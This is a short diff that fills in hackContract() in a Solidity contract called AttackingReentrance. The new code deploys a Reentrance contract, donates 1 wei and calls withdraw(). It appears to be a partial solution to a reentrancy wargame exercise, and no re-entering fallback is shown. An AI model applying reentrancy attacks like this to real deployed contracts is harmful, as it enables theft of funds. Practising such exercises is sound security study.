@@ -10,6 +10,9 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
-        // Code me!
+    
+        Reentrance reentrance = new Reentrance();
+        reentrance.donate{value: 1}(address(this));
+        reentrance.withdraw();
     }
 }
